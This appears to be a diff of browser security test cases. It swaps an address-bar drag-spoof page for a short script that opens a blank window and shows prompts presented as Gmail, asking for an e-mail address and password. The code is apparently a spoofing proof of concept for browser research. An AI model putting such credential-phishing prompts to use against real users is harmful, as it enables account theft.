@@ -1,26 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Drag Spoof Testcase By Code Audit Labs of VulnHunt.com</title>
-</head>
-<body draggable="true">
 
-  <h3><a href="http://www.google.com" id="a">Drag Me To Address Bar</a></h3>
-  
-  <h3 id="note" style="display:none;">
-    <img src="https://i.ibb.co.com/xS0bMW7S/image.png" alt="Obito Scene" style="max-width: 500px; height: auto;">
-    <br>
-    I Am Not Google At All
-  </h3>
-
-</body>
-
-<script>
-  ondragend = function(){
-    stop();
-    document.title = 'Done';
-    a.style.display = 'none';
-    note.style.display = 'block';
-  }
-</script>
-</html>
+<script> function go(){ 
+ var x=window.open('about:blank'); 
+ setTimeout(function(){
+ a=x.alert('Go to gmail.com');x.prompt('E-mail','');b=x.prompt('Password','');x.alert('Welcome to Gmail.com');} ,1000);
+  } 
+ </script> 
+ 
+ <button onclick="go()">go</button>
